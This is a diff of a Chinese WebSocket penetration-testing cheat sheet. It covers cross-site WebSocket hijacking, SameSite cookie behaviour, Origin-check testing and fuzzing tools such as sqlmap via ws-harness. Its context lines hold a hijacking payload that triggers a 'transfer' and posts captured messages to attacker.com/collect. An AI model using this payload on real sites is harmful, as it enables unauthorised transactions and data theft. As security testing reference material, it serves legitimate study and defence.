@@ -27,7 +27,7 @@ ws.onopen = () => ws.send(JSON.stringify({action:'transfer',to:'attacker',amount
 ws.onmessage = (e) => fetch('https://attacker.com/collect',{method:'POST',body:e.data});   // 读+外带
 ```
 **SameSite 行为**（升级请求自动带 cookie）: `None` 总发（CSWSH 可用）；`Lax`/`Strict` 不发（WS 非顶层导航）→ 阻断；legacy 无属性 cookie 老浏览器当 None。
-测试: Burp 拦截升级请求改 `Origin: https://attacker.com` → 仍 101 = 无校验（再测子域变体）。
+测试: python websocket-client 连接时设 `origin: https://attacker.com` 头 → 仍 101 = 无校验（再测子域变体）。
 
 ## §3 升级后走私
 
@@ -80,10 +80,10 @@ ws.send(msgpack.packb(data), opcode=0x2)
 | 工具 | 用途 |
 |---|---|
 | wsrepl | 交互测试（`-P` 插件复现 cookie/token 刷新） |
-| ws-harness | WS→HTTP 桥接接 sqlmap（`-u ws:// -m message.txt` → `sqlmap -u "http://127.0.0.1:8000/?fuzz=test"`） |
-| Burp + SocketSleuth | 拦截/改帧（含二进制） |
-| WebSocket Turbo Intruder | 高速脚本化 fuzz |
-| protobuf-inspector / msgpack-tools / wsdump / Wireshark | 二进制分析/原始帧回放/协议剖析 |
+| ws-harness | WS→HTTP 桥接接 sqlmap（`-u ws:// -m message.txt` → `$(dirname $PYTHON_CMD)/sqlmap -u "http://127.0.0.1:8000/?fuzz=test"`） |
+| wsdump.py (websocket-client) | 交互式连 WS 发收帧（可设任意头） |
+| python websocket-client + asyncio | 脚本化 fuzz（自写循环） |
+| protobuf-inspector / msgpack-tools / tshark | 二进制帧解析/协议剖析（tshark -Y websocket） |
 
 ## §7 关联文件
 
